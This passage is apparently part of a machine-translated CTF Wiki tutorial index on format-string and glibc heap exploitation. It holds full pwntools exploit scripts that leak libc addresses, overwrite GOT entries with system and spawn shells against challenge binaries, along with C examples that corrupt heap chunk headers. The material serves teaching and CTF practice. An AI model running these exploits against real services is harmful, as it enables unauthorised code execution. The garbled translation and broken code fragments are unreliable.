\"debug\" context . arch = \"x86\" io = process ( \"./contacts\" ) binary = ELF ( \"contacts\" ) libc = binary . libc def createcontact ( io , name , phone , descrip_len , description ): I sh = sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact ( io ): I sh = sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) # Gdb.attach (I) createcontact ( io , & quot ; 1 & quot ;, & quot ; 1 & quot ;, & quot ; 111 & quot ;, & quot ; % 31 $ paaaa & quot ;) printcontact ( I ) libc_start_main = int ( io . recvuntil ( 'aaaa' , drop = True ), 16 ) - 241 log . success ( 'get libc_start_main addr: ' + hex ( libc_start_main )) libc_base = libc_start_main - libc . symbols [ \"__libc_start_main\" ] system = libc_base + libc . symbols [ \"system\" ] binsh = libc_base + next ( libc . search ( \"/bin/sh\" )) log . success ( \"system: \" + hex ( system )) log . success ( \"binsh: \" + hex ( binsh )) payload = '%6$p%11$pccc' + p32 ( system ) + 'bbbb' + p32 ( binsh ) + \"dddd\" createcontact ( io , '2' , '2' , '111' , payload ) printcontact ( I ) io . recvuntil ( & #39;Description:&#39;) data = io . recvuntil ( 'ccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) + 12 log . success ( \"ebp: \" + hex ( system )) log . success ( \"heap: \" + hex ( heap_addr )) part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' #payload=fmtstr_payload(6,{ebp_addr:heap_addr}) ##print payload createcontact ( io , '3333' , '123456789' , '300' , payload ) printcontact ( I ) io . recvuntil ( & #39;Description:&#39;) io . recvuntil ( & #39;Description:&#39;) ##gdb.attach(sh) log . success ( \"get shell\" ) io . recvuntil ( & #39;&gt;&gt;&gt;&#39;) ##get shell io . sendline ( & #39;5&#39;) io . interactive () It should be noted that this does not stabilize the shell because we have entered a string that is too long. But we have no way to control the address we want to enter in the front. It can only be this way. Why do you need to print so much? Because the format string is not on the stack, even if we get the address of the ebp that needs to be changed, there is no way to write this address to the stack, use the $ symbol to locate him; because there is no way to locate, there is no way to use l \\ll and other ways to write this address, so only print a lot.","title":"Using the program"},{"location":"pwn/linux/fmtstr/fmtstr_example/#format-string-blind-hit","text":"","title":"Format string blind hit"},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_4","text":"The so-called format string blind typing means that only the interactive ip address and port are given. The corresponding binary file is not given to let us perform pwn. In fact, this is similar to BROP, but BROP uses stack overflow, and here We are using a format string vulnerability. In general, we follow the steps below Determine the number of bits in the program Identify the location of the vulnerability -Use Since I didn't find the source code after the game, I simply constructed two questions.","title":"Principle"},{"location":"pwn/linux/fmtstr/fmtstr_example/#example-1-leaking-stack","text":"Both the source and deployment files are placed in the corresponding folder [fmt_blind_stack] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack ).","title":"Example 1 - Leaking Stack"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determine-the-number-of-programs","text":"We randomly entered %p and the program echoed the following information. \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% Tell us that the flag is on the stack and that the program is 64-bit and that there should be a format string vulnerability.","title":"Determine the number of programs"},{"location":"pwn/linux/fmtstr/fmtstr_example/#use","text":"Then let's take a little test and see from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '% {} $p' . format ( i ) leak ( payload ) i += 1 Finally, I simply looked at the output and got the flag. //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { exam s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00","title":"Use"},{"location":"pwn/linux/fmtstr/fmtstr_example/#example-2-blind-hijacking-got","text":"The source code and deployment files are already in the blind_fmt_got folder.","title":"Example 2 - Blind hijacking got"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determine-the-number-of-programs_1","text":"By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit. \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 This time, I didn't show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.","title":"Determine the number of programs"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset_2","text":"Before the leak procedure, we still have to determine the offset of the format string, as follows \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 Based on this, we can know that the starting address offset of the format string is 6.","title":"Determining the offset"},{"location":"pwn/linux/fmtstr/fmtstr_example/#leaking-binary","text":"Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the '\\x00' character, otherwise it can't be revealed how to play, after that, the output must be truncated by '\\x00', this is because The output functions of the format string exploit are truncated by '\\x00'. . So we can use the leak code below. ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) #\u8bf4\u660e\u6709\\n, a new line appears if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num + = 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr + = len ( data ) f . close () getbinary () It should be noted that in the payload, it is necessary to judge whether or not '\\n' appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.","title":"leaking binary"},{"location":"pwn/linux/fmtstr/fmtstr_example/#ary","text":"Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function. ` asm seg000:00000000004005F6 push rbp seg000:00000000004005F7 mov rbp, rsp seg000:00000000004005FA add rsp, 0FFFFFFFFFFFFFF80h seg000:00000000004005FE seg000:00000000004005FE loc_4005FE: ; CODE XREF: seg000:0000000000400639\u0019j seg000:00000000004005FE lea rax, [rbp-80h] seg000:0000000000400602 mov edx, 80h ; '\u20ac' seg000:0000000000400607 mov rsi, rax seg000: 000000000040060A mov edi, 0 seg000:000000000040060F mov eax, 0 seg000:0000000000400614 call sub_4004C0 seg000:0000000000400619 lea rax, [rbp-80h] seg000: 000000000040061D mov rdi, rax seg000:0000000000400620 mov eax, 0 seg000:0000000000400625 call sub_4004B0 seg000:000000000040062A mov rax, cs:601048h seg000: 0000000000400631 mov rdi, rax seg000:0000000000400634 call near ptr unk_4004E0 seg000:0000000000400639 jmp short loc_4005FE It can be basically determined that sub\\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing. #### Using ideas After analyzing the above, we can determine the following basic ideas - leak the address of the printf function, - Get the corresponding libc and system function address - Modify printf address to system function address - Read /bin/sh; to get the shell #### Using the program The procedure is as follows. ```python ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context.arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak(addr): # leak addr for three times num = 0 while num < 3: try: print 'leak addr: ' + hex(addr) sh = remote(ip, port) payload = '%00008$s' + 'STARTEND' + p64(addr) #\u8bf4\u660e\u6709\\n, a new line appears if '\\x0a' in payload: return None sh.sendline(payload) data = sh.recvuntil('STARTEND', drop=True) sh.close() return data except Exception: num + = 1 continue return None def getbinary(): addr = 0x400000 f = open('binary', 'w') while addr < 0x401000: data = leak(addr) if data is None: f.write('\\xff') addr += 1 elif len (data) == 0: f.write('\\x00') addr += 1 else: f.write(data) addr + = len (data) f.close() ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote(ip, port) ## let the read get resolved sh.sendline('a') sh.recv() ## get printf addr payload = '%00008$s' + 'STARTEND' + p64(read_got) sh.sendline(payload) data = sh.recvuntil (&#39;STARTEND&#39;, drop = True) .ljust (8, &#39;x00&#39;) sh.recv() read_addr = u64(data) ## get system addr libc = LibcSearcher('read', read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') log.success('system addr: ' + hex(system_addr)) log.success('read addr: ' + hex(read_addr)) ## modify printf_got payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short') ## get all the addr addr = payload[:32] payload = '%32d' + payload[32:] offset = (int)(math.ceil(len(payload) / 8.0) + 1) for i in range(6, 10): old = '%{}$'.format(i) new = '%{}$'.format(offset + i) payload = payload.replace(old, new) remainer = len(payload) % 8 payload += (8 - remainer) * 'a' payload += addr sh.sendline(payload) sh.recv() ## get shell sh.sendline('/bin/sh;') sh.interactive() What needs to be noted here is this code. ## modify printf_got payload = fmtstr_payload ( 6 , { printf_got : system_addr }, 0 , write_size = 'short' ) ## get all the addr addr = payload [: 32 ] payload = ' %32d ' + payload [ 32 :] offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) for i in range ( 6 , 10 ): old = '% {} $' . format ( i ) new = '% {} $' . format ( offset + i ) payload = payload . replace ( old , new ) remainer = len ( payload ) % 8 payload += ( 8 - remainer ) * 'a' payload += addr sh . sendline ( payload ) sh . recv () Fmtstr_payload directly get the payload will put the address in front, and this will lead to '\\x00' truncation of printf ( About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon ). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is offset = ( int )( math . ceil ( len ( payload ) / 8.0 ) + 1 ) This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of '%order$hn' will not be greater than 8. Specific can be deduced by yourself.","title":"\u5206\u6790\u658cary"},{"location":"pwn/linux/fmtstr/fmtstr_example/#title","text":"SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)","title":"Title"},{"location":"pwn/linux/fmtstr/fmtstr_intro/","text":"Format string vulnerability principle introduction \u00b6 First, a brief introduction to the principles of formatting string vulnerabilities. Format string function introduction \u00b6 The format string function accepts a variable number of arguments and uses the first argument as a format string, from which the parsed argument is parsed. In general, formatting a string function is to convert the data represented in the computer's memory into our human-readable string format. Almost all C/C++ programs use formatted string functions to output information, debug programs, or process strings . In general, formatted strings are mainly divided into three parts when utilized. Format string function format string Subsequent parameters, optional Here we give a simple example, I believe that most people have been exposed to printf functions and the like. Then we will introduce them one by one. Format string function \u00b6 Common formatted string functions have Enter scanf output Function Basic introduction | printf | output to stdout | | fprintf | Output to the specified FILE stream | | vprintf | Formatting output to stdout based on parameter list | | vfprintf | Formatting output to the specified FILE stream according to the parameter list | | sprintf | Output to String | | snprintf | Output the specified number of bytes to the string | | vsprintf | Formatting output to a string based on a parameter list | | vsnprintf | Formatting Output Specified Bytes to Strings Based on Parameter List | | setproctitle | set argv | | syslog | output log | | err, verr, warn, vwarn \u7b49 | ... | Format string \u00b6 Here we understand the format of the format string, the basic format is as follows %[parameter][flags][field width][.precision][length]type For the meaning of each pattern, please refer to the Wikipedia [format string] ( https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96 % E5%AD%97%E7%AC%A6%E4%B8%B2). The corresponding choices in the following patterns need to focus on parameter n$, get the specified parameters in the format string flag field width the minimum width of the output precision the maximum length of the output length, the length of the output hh, output one byte h, output a double byte type d/i, signed integer u, unsigned integer x/X, hexadecimal unsigned int. x uses lowercase letters; X uses uppercase letters. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty. o, octal unsigned int. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty. s, if the l flag is not used, the null end string is output until the upper limit specified by the precision; if no precision is specified, all bytes are output. If the l flag is used, the corresponding function parameter points to an array of type wchar_t, and each wide character is converted to a multi-byte character at the time of output, which is equivalent to calling the wcrtomb function. c, if the l flag is not used, convert the int parameter to unsigned char output; if the l flag is used, the wint_t parameter is converted to a wchart_t array containing two elements, the first element containing the character to be output The second element is a null wide character. p, void * type, output the value of the corresponding variable. Printf(\"%p\",a) prints the value of the variable a in the format of the address, printf(\"%p\", &a) prints the address where the variable a is located. n, does not output characters, but writes the number of characters that have been successfully output to the variable pointed to by the corresponding integer pointer parameter. %, ' % ' literal, does not accept any flags, width. Parameters \u00b6 It is the corresponding variable to be output. Format string vulnerability principle \u00b6 In the beginning, we will give a basic introduction to formatting strings, and here are some more detailed content. We said above that the format string function is parsed according to the format string function. Then the corresponding number of parameters to be parsed is naturally controlled by this format string . For example, '%s' indicates that we will output a string argument. Let\u2019s continue with the above example as an example. ![Basic example] (./figure/printf.png) For such an example, before entering the printf function (that is, printf has not been called yet), the layout on the stack from high address to low address is as follows some value 3.14 123456 addr of \"red\" addr of format string: Color %s... Note: Here we assume that the value above 3.14 is some unknown value. After entering printf, the function first gets the first parameter, and one by one reads two characters. The current character is not % and is output directly to the corresponding standard output. the current character is %, continue reading the next character If there are no characters, an error is reported. If the next character is %, output % Otherwise, according to the corresponding characters, get the corresponding parameters, parse and output them So suppose that at this time we wrote the following when we wrote the program. printf ( \"Color %s, Number %d, Float %4.2f\" ); At this point we can see that we did not provide the parameters, then how will the program run? The program will still run, parsing the three variables above the formatted string address on the stack into Parse the string corresponding to its address Parse the integer value corresponding to its content Parse the floating point value corresponding to its content For 2, 3, it doesn't matter, but for 1, if an inaccessible address, such as 0, is provided, the program will crash. This is basically the basic principle of formatting string vulnerabilities. Reference reading \u00b6 https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","title":"Format String Vulnerability Principle"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-vulnerability-principle-introduction","text":"First, a brief introduction to the principles of formatting string vulnerabilities.","title":"Format string vulnerability principle introduction"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-function-introduction","text":"The format string function accepts a variable number of arguments and uses the first argument as a format string, from which the parsed argument is parsed. In general, formatting a string function is to convert the data represented in the computer's memory into our human-readable string format. Almost all C/C++ programs use formatted string functions to output information, debug programs, or process strings . In general, formatted strings are mainly divided into three parts when utilized. Format string function format string Subsequent parameters, optional Here we give a simple example, I believe that most people have been exposed to printf functions and the like. Then we will introduce them one by one.","title":"Format string function introduction"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-function","text":"Common formatted string functions have Enter scanf output Function Basic introduction | printf | output to stdout | | fprintf | Output to the specified FILE stream | | vprintf | Formatting output to stdout based on parameter list | | vfprintf | Formatting output to the specified FILE stream according to the parameter list | | sprintf | Output to String | | snprintf | Output the specified number of bytes to the string | | vsprintf | Formatting output to a string based on a parameter list | | vsnprintf | Formatting Output Specified Bytes to Strings Based on Parameter List | | setproctitle | set argv | | syslog | output log | | err, verr, warn, vwarn \u7b49 | ... |","title":"Format string function"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string","text":"Here we understand the format of the format string, the basic format is as follows %[parameter][flags][field width][.precision][length]type For the meaning of each pattern, please refer to the Wikipedia [format string] ( https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96 % E5%AD%97%E7%AC%A6%E4%B8%B2). The corresponding choices in the following patterns need to focus on parameter n$, get the specified parameters in the format string flag field width the minimum width of the output precision the maximum length of the output length, the length of the output hh, output one byte h, output a double byte type d/i, signed integer u, unsigned integer x/X, hexadecimal unsigned int. x uses lowercase letters; X uses uppercase letters. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty. o, octal unsigned int. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty. s, if the l flag is not used, the null end string is output until the upper limit specified by the precision; if no precision is specified, all bytes are output. If the l flag is used, the corresponding function parameter points to an array of type wchar_t, and each wide character is converted to a multi-byte character at the time of output, which is equivalent to calling the wcrtomb function. c, if the l flag is not used, convert the int parameter to unsigned char output; if the l flag is used, the wint_t parameter is converted to a wchart_t array containing two elements, the first element containing the character to be output The second element is a null wide character. p, void * type, output the value of the corresponding variable. Printf(\"%p\",a) prints the value of the variable a in the format of the address, printf(\"%p\", &a) prints the address where the variable a is located. n, does not output characters, but writes the number of characters that have been successfully output to the variable pointed to by the corresponding integer pointer parameter. %, ' % ' literal, does not accept any flags, width.","title":"Format string"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#parameters","text":"It is the corresponding variable to be output.","title":"Parameters"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-vulnerability-principle","text":"In the beginning, we will give a basic introduction to formatting strings, and here are some more detailed content. We said above that the format string function is parsed according to the format string function. Then the corresponding number of parameters to be parsed is naturally controlled by this format string . For example, '%s' indicates that we will output a string argument. Let\u2019s continue with the above example as an example. ![Basic example] (./figure/printf.png) For such an example, before entering the printf function (that is, printf has not been called yet), the layout on the stack from high address to low address is as follows some value 3.14 123456 addr of \"red\" addr of format string: Color %s... Note: Here we assume that the value above 3.14 is some unknown value. After entering printf, the function first gets the first parameter, and one by one reads two characters. The current character is not % and is output directly to the corresponding standard output. the current character is %, continue reading the next character If there are no characters, an error is reported. If the next character is %, output % Otherwise, according to the corresponding characters, get the corresponding parameters, parse and output them So suppose that at this time we wrote the following when we wrote the program. printf ( \"Color %s, Number %d, Float %4.2f\" ); At this point we can see that we did not provide the parameters, then how will the program run? The program will still run, parsing the three variables above the formatted string address on the stack into Parse the string corresponding to its address Parse the integer value corresponding to its content Parse the floating point value corresponding to its content For 2, 3, it doesn't matter, but for 1, if an inaccessible address, such as 0, is provided, the program will crash. This is basically the basic principle of formatting string vulnerabilities.","title":"Format string vulnerability principle"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#reference-reading","text":"https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","title":"Reference reading"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/","text":"Chunk Extend and Overlapping \u00b6 Introduction \u00b6 Chunk extend is a common use of heap vulnerabilities. The effect of chunk overlapping can be achieved by extend. This method of utilization requires the following timing and conditions: There is a heap-based vulnerability in the program Vulnerabilities can control data in chunk headers Principle \u00b6 The chunk extend technique can be generated by the various macros that ptmalloc uses when working with heap chunks. In ptmalloc, the operation of getting the chunk size is as follows /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) One is to directly get the size of the chunk, not to ignore the mask part, and the other is to ignore the mask part. In ptmalloc, the operation of getting the next chunk block address is as follows /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) That is, use the current block pointer plus the current block size. In ptmalloc, the operation of getting the previous chunk information is as follows /* Size of the chunk below P. Only valid if prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) That is, the size of the previous block is obtained by malloc_chunk->prev_size, and then the obtained size is subtracted from the chunk address. In ptmalloc, the operation of determining whether the current chunk is in the use state is as follows: #define inuse(p) ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) That is, look at the prev_inuse field of the next chunk, and the next block address is calculated according to the size of the current chunk as we mentioned earlier. See the section \"Heap related data structures\" for more details. As can be seen from the above macros, ptmalloc uses the chunk header data to determine the usage of the chunk and to locate the chunks before and after the chunk. In short, chunk extend is achieved by controlling the size and pre_size fields to achieve overlapping operations. Similar to chunk extend, there is an operation called chunk shrink. Only the use of chunk extend is introduced here. Basic example 1: Extend the fastbin of inuse \u00b6 In simple terms, the effect of this utilization is to control the content of the second block by changing the size of the first block. Note that our examples are all in 64-bit programs. If you want to test under 32 bits, you can change the 8-byte offset to 4 bytes . int main(void) { void * ptr, * ptr1; Ptr=malloc(0x10);//Assign the first 0x10 chunk Malloc (0x10); / / assign a second 0x10 chunk *(long long *)((long long)ptr-0x8)=0x41;// Modify the size field of the first block free(ptr); Ptr1=malloc(0x30);// Implement extend to control the content of the second block return 0; } When two malloc statements are executed, the heap's memory is distributed as follows 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <=== top chunk After that, we changed the size field of chunk1 to 0x41, which is because the size field of the chunk contains the size of the user control and the size of the header. As shown above, the size is exactly 0x40. This step can be obtained from heap overflow in the title. 0x602000: 0x0000000000000000 0x0000000000000041 &lt;=== Tamper size 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 After executing free, we can see that chunk2 and chunk1 are combined into a 0x40 chunk and released. Fastbins[idx=0, size=0x10] 0x00 Fastbins[idx=1, size=0x20] 0x00 Fastbins[idx=2, size=0x30] \u2190 Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00 Fastbins[idx=4, size=0x50] 0x00 Fastbins[idx=5, size=0x60] 0x00 Fastbins[idx=6, size=0x70] 0x00 Then we get the block of chunk1+chunk2 through malloc (0x30), then we can directly control the contents of chunk2, we also call this state the overlapping chunk. call 0x400450 <malloc@plt> mov QWORD PTR [rbp-0x8], rax rax = 0x602010 Basic example 2: Extend the smallbin of inuse \u00b6 Through a deep understanding of the implementation part of the heap, we know that the chunks in the fastbin range will be placed in the fastbin list, and the chunks that are not in this range will be placed in the unsorted bin list. In the following example, we use the size 0x80 to allocate the heap (as a comparison, the default maximum chunk for fastbin can be used as 0x70) int main() { void * ptr, * ptr1; Ptr=malloc(0x80);//Assign the first chunk1 of 0x80 Malloc (0x10); / / allocate the second 0x10 chunk2 Malloc (0x10); / / prevent merger with top chunk * (int *) ((int) ptr-0x8) = 0xb1; free(ptr); ptr1=malloc(0xa0); } In this example, because the allocated size is not in the range of fastbin, if it is connected to the top chunk when it is released, it will merge with the top chunk. So we need to allocate an additional chunk to separate the released chunk from the top chunk. 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;===chunk1 tamper with the size field 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000021 &lt;=== Prevent merged chunks 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk After release, chunk1 swallows the contents of chunk2 and puts them together into the unsorted bin. 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== was put into the unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x00000000000000b0 0x0000000000000020 &lt;=== Note that this is marked as empty 0x6020c0: 0x0000000000000000 0x0000000000000000 0x6020d0: 0x0000000000000000 0x0000000000020f31 <=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) When the allocation is made again, the chunk1 and chunk2 spaces are retrieved, and we can control the contents of chunk2. 0x4005b0 <main+74> call 0x400450 <malloc@plt> \u2192 0x4005b5 <main+79> mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010 Basic example 3: Extend the free smallbin \u00b6 Example 3 is based on Example 2, this time we release chunk1 and then modify the size field of chunk1 in the unsorted bin. int main() { void * ptr, * ptr1; Ptr=malloc(0x80);//Assign the first chunk1 of 0x80 Malloc (0x10); / / assign the second 0x10 chunk2 Free(ptr);//First release, so that chunk1 enters unsorted bin * (int *) ((int) ptr-0x8) = 0xb1; ptr1=malloc(0xa0); } The results after two malloc are as follows 0x602000: 0x0000000000000000 0x0000000000000091 <=== chunk 1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000000 0x0000000000000021 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 We first release chunk1 to make it into the unsorted bin. unsorted_bins[0]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE) 0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== Entering unsorted bin 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 <=== chunk 2 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 <=== top chunk Then tamper with the size field of chunk1 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== size field was tampered with 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000000 0x602090: 0x0000000000000090 0x0000000000000020 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000020f51 At this point, the malloc allocation can be used to get the chunk of chunk1+chunk2, thus controlling the content of chunk2. Chunk Extend/Shrink What can I do? \u00b6 In general, this technique does not directly control the execution flow of the program, but it can control the contents of the chunk. If chunks have string pointers, function pointers, etc., they can be used to leak information and control the execution flow. In addition, chunk overlap can be realized by extend, and the fd/bk pointer of the chunk can be controlled by overlapping, so that the use of fastbin attack can be realized. Basic example 4: Overlapping after extend \u00b6 Here we show backward overlapping through extend, which is also the most common case in CTF, and other uses can be achieved through overlay. int main() { void * ptr, * ptr1; Ptr=malloc(0x10);//Assign the first 0x80 chunk1 Malloc (0x10); / / allocate the second 0x10 chunk2 Malloc (0x10); / / allocate the third 0x10 chunk3 Malloc (0x10); / / allocate the 4th 0x10 chunk4 * (int *) ((int) ptr-0x8) = 0x61; free(ptr); ptr1=malloc(0x50); } After the malloc (0x50) re-occupies the extend area, the 0x10 fastbin block can still be allocated and released normally. At this time, the overlay is already formed, and the fastbin attack can be realized by performing the operation on the overlapping. Basic example 5: Forwarding through extend \u00b6 This shows that the previous block is merged by modifying the pre_inuse field and the pre_size field. int main(void) { void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 Malloc (0x10); / / prevent merge with top free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//Modify the pre_inuse field *(int *)((long long)ptr4-0x10)=0xd0;//Modify the pre_size field Free(ptr4);//unlink for forward extend Malloc (0x150); / / placeholder block } The forward extend 